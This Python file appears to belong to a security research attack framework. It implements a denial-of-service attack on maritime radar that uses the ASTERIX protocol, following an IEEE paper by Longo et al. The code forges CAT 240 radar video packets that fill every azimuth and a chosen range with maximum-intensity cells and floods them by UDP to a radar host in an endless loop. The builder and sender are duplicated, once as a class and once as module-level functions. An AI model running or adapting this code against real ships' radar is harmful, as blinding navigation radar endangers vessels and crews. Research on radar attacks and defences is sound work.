import asyncio
import logging
import socket
import struct
import random

from attacks import Attack, AttackNumberParameter
from settings import ASTERIX_HOST, ASTERIX_PORT, LISTEN_INTERFACE

class DOSRadarAttack(Attack):

  MAX_VIDEO_MESSAGE_INDEX = 2 ** 32 - 1

  def __init__(self):
    super().__init__('dos_radar', 'DoS ASTERIX radar', 'Obscure ASTERIX radar', [
      AttackNumberParameter('range_nm', 'Range to obscure in NM', min = 1.0, max = 24.0, default = 12.0),
      AttackNumberParameter('injection_hz', 'Frequency of the packets injection', default = 1.0),
    ])

  def get_asterix_dos_packet(self, video_message_index: int, range_m: float):
    '''
    Implemention of DoS from "Attacking (and defending) the Maritime Radar System"
    @article{Longo2023,
      doi = {10.1109/tifs.2023.3282132},
      url = {https://doi.org/10.1109/tifs.2023.3282132},
      year = {2023},
      publisher = {Institute of Electrical and Electronics Engineers ({IEEE})},
      pages = {1--1},
      author = {Giacomo Longo and Enrico Russo and Alessandro Armando and Alessio Merlo},
      title = {Attacking (and Defending) the Maritime Radar System},
      journal = {{IEEE} Transactions on Information Forensics and Security}
    }
    '''
    packet = bytearray()
    # CAT
    packet += struct.pack('!B', 240)
    # LEN
    packet += struct.pack('!H', 0) # Temporary LEN field
    # FSPEC
    fspec = bytes([
      0b1110_1011, # 010 000 X 020  _ 040   X   048 FX
      0b1100_0000, # 049 050 X X    _   X   RE  SP  FX
    ])
    packet += fspec
    # 010
    packet += struct.pack('!BB', 0, 0) # SIC SAC
    # 000
    packet += struct.pack('!B', 2)
    # 020
    packet += struct.pack('!L', video_message_index)
    # 040
    packet += struct.pack('!H', 0)                  # START_AZ
    packet += struct.pack('!H', 2 ** 16 - 1)        # END_AZ
    packet += struct.pack('!L', 0)                  # START_RG
    cell_duration_s = (range_m * 2 / 299_792_458)
    cell_duration_s /= 4
    cell_duration_raw = int(round(cell_duration_s / 1e-9))
    packet += struct.pack('!L', cell_duration_raw)  # CELL_DUR
    # 048
    packet += struct.pack('!BB', 0, 4) # Compression Resolution
    # 049
    packet += struct.pack('!H', 4)     # N_OCTETS
    packet += struct.pack('!BH', 0, 4) # N_CELLS
    # 050
    packet += struct.pack('!B', 1)                          # REP
    packet += struct.pack('!BBBB', 0xFF, 0xFF, 0xFF, 0xFF)  # VB[0] cells
    # Set LEN
    struct.pack_into('!H', packet, 1, len(packet))
    return bytes(packet)

  async def run(self, range_nm: float = 12.0, injection_hz: float = 5.0):
    range_m = range_nm * 1852.0
    self.logger.info('ASTERIX DoS attack (Hz = %f, Range m = %f)', injection_hz, range_m)
    loop = asyncio.get_running_loop()
    interval = 1.0 / injection_hz
    index = random.randint(0, self.MAX_VIDEO_MESSAGE_INDEX)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
      sock.setblocking(False)
      sock.bind((LISTEN_INTERFACE, 0))
      while True:
        packet = get_asterix_dos_packet(index, range_m)
        await loop.sock_sendto(sock, packet, (ASTERIX_HOST.exploded, ASTERIX_PORT))
        index += 1
        index %= MAX_VIDEO_MESSAGE_INDEX
        await asyncio.sleep(interval)


MAX_VIDEO_MESSAGE_INDEX = 2 ** 32 - 1

def get_asterix_dos_packet(video_message_index: int, range_m: float):
  '''
  Implemention of DoS from "Attacking (and defending) the Maritime Radar System"
  @article{Longo2023,
    doi = {10.1109/tifs.2023.3282132},
    url = {https://doi.org/10.1109/tifs.2023.3282132},
    year = {2023},
    publisher = {Institute of Electrical and Electronics Engineers ({IEEE})},
    pages = {1--1},
    author = {Giacomo Longo and Enrico Russo and Alessandro Armando and Alessio Merlo},
    title = {Attacking (and Defending) the Maritime Radar System},
    journal = {{IEEE} Transactions on Information Forensics and Security}
  }
  '''
  packet = bytearray()
  # CAT
  packet += struct.pack('!B', 240)
  # LEN
  packet += struct.pack('!H', 0) # Temporary LEN field
  # FSPEC
  fspec = bytes([
    0b1110_1011, # 010 000 X 020  _ 040   X   048 FX
    0b1100_0000, # 049 050 X X    _   X   RE  SP  FX
  ])
  packet += fspec
  # 010
  packet += struct.pack('!BB', 0, 0) # SIC SAC
  # 000
  packet += struct.pack('!B', 2)
  # 020
  packet += struct.pack('!L', video_message_index)
  # 040
  packet += struct.pack('!H', 0)                  # START_AZ
  packet += struct.pack('!H', 2 ** 16 - 1)        # END_AZ
  packet += struct.pack('!L', 0)                  # START_RG
  cell_duration_s = (range_m * 2 / 299_792_458)
  cell_duration_s /= 4
  cell_duration_raw = int(round(cell_duration_s / 1e-9))
  packet += struct.pack('!L', cell_duration_raw)  # CELL_DUR
  # 048
  packet += struct.pack('!BB', 0, 4) # Compression Resolution
  # 049
  packet += struct.pack('!H', 4)     # N_OCTETS
  packet += struct.pack('!BH', 0, 4) # N_CELLS
  # 050
  packet += struct.pack('!B', 1)                          # REP
  packet += struct.pack('!BBBB', 0xFF, 0xFF, 0xFF, 0xFF)  # VB[0] cells
  # Set LEN
  struct.pack_into('!H', packet, 1, len(packet))
  return bytes(packet)

async def dos_radar(injection_hz: float = 5.0, range_m: float = 12.0 * 1852.0):
  logger = logging.getLogger(dos_radar.__name__)
  logger.info('ASTERIX DoS attack (Hz = %f, Range m = %f)', injection_hz, range_m)
  loop = asyncio.get_running_loop()
  interval = 1.0 / injection_hz
  index = random.randint(0, MAX_VIDEO_MESSAGE_INDEX)
  with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
    sock.setblocking(False)
    sock.bind((LISTEN_INTERFACE, 0))
    while True:
      packet = get_asterix_dos_packet(index, range_m)
      await loop.sock_sendto(sock, packet, (ASTERIX_HOST.exploded, ASTERIX_PORT))
      index += 1
      index %= MAX_VIDEO_MESSAGE_INDEX
      await asyncio.sleep(interval)
